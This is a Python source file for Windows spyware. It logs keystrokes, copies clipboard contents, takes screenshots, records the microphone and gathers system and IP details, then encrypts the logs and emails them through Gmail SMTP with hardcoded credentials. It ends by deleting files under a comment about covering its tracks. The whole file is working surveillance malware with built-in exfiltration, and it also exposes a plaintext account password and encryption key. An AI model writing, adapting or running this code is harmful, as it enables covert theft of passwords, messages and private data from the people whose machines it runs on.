# Libraries

# These are modules for handling email content in different formats.
# They allow you to structure an email with a subject, text, attachments, etc.,
# and encode it properly before sending.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# This is the library for connecting to an email server to send emails.
import smtplib

# Used for network-related functions, such as getting your IP address.
import socket

# Helps identify the operating system and other system information.
import platform
from fileinput import filename

# Lets you access and control the clipboard (copy-paste) on Windows.
# Useful for logging anything copied to the clipboard.
import win32clipboard

# This library helps in monitoring and recording keystrokes as the user types.
from pynput.keyboard import Key, Listener

import time
import os

# Allows saving audio files in the .wav format.
from scipy.io.wavfile import write

# Records sound using your microphone.
import sounddevice as sd

# Provides encryption for files or data, making it unreadable without a key.
# Useful for encrypting logs or data.
from cryptography.fernet import Fernet

# Retrieves the username of the person using the computer.
import getpass
# Used to make HTTP requests, such as getting your public IP address from an online service.
from requests import get

# These allow your program to run multiple tasks (processes) in parallel.
from multiprocessing import Process, freeze_support

# Captures screenshots of the screen.
from PIL import ImageGrab
from scipy.stats import false_discovery_control

keys_information = "key_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

keys_information_encrypted = "key_log_e.txt"
system_information_encrypted = "systeminfo_e.txt"
clipboard_information_encrypted = "clipboard_e.txt"

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

key = "2OtynUrVYo-F_wVt9LkcvQyucxKhGdN6fzMfjcJW8mk="

email_address = "temp26204@gmail.com"
password = "ipjuszgndaumfbeb"

toaddr = "temp26204@gmail.com"

file_path = "C:\\Users\\ASUS\\PycharmProjects\\pythonProject\\Project"
extend = "\\"
file_merge = file_path + extend

# send info. through mail
def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log file"

    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

print("Attempting to send email...")
#send_email(keys_information, file_path + extend + keys_information, toaddr)
print("Email function completed.")

# to get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

# to get hte clipboard information
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard option not working")

copy_clipboard()

# to get audio information
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


# to get the screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# to get the time
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:

        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# to encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_encrypted, file_merge + clipboard_information_encrypted, file_merge + keys_information_encrypted]

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120)

#Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)


